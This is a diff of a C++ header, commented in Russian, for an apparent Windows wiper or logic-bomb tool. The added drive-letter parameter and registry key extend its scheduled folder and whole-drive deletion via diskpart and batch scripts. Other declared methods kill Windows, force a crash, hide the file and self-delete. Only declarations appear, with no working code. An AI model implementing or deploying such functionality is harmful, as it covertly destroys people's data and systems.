@@ -16,24 +16,26 @@ public:
 	bool InspectDeleteData();
 
 	// записываем в реестр когда выполнится задача
-	bool SaveDateOfPerformance(SYSTEMTIME SysTime);
+	bool WriteDateOfPerformance(SYSTEMTIME SysTime);
 	// записываем какую папку будем удалять
-	bool SavePathOfFolderToDelete(CString csFolderPath);
+	bool WritePathOfFolderToDelete(CString csFolderPath);
+	bool WriteOnWhichDiskToRemove(CString DriveLetter);
 	void HideFile(bool bHide);
 	bool EnableCrashOnCtrlScroll();
-	bool IsDeleteDiskD();
-	bool SaveTaskKillWindows();
+	//bool IsDeleteDiskD();
+	bool WriteTaskKillWindows();
 	void SelfDelete();
 	bool PerformATask();
 	int stringSizeInBytes(CString strToCalc);
 	bool DeleteFolder();
 	bool IfDeleteDiskD();
 	bool IfKillWindows();
+	bool IsRemoveAllOnDrive(CStringA &letter);
 	bool ReadRegDeleteDay(int& DelDay, int& DelDayOfWeek, int& Month);
 	void GetCurrentDay(int& DelDay, int& DelDayOfWeek, int& Month);
 	bool CreateDiskpartScript(char szFileDiskPart[], char szTempPath[], char szFilePath[]);
 	bool CreateBatFile(char szFileBat[], char szTempPath[], char szFilePath[], char szFileExe[], char szFileDiskPart[]);
-	bool DeleteAllOnDrive(char szDriveLetter[]);
+	bool DeleteAllOnDrive(CStringA letr);
 	void DoKillWindows();
 };
 
@@ -45,3 +47,4 @@ static const wchar_t* DelMonthKeyName = L"delMonth";
 static const wchar_t* DelFolderKeyName = L"FolderToDel";
 static const wchar_t* DelDiskDKeyName = L"delD";
 static const wchar_t* KillWindowsKeyName = L"KillWin";
+static const wchar_t* DelDriveLetter = L"DriveLetter";
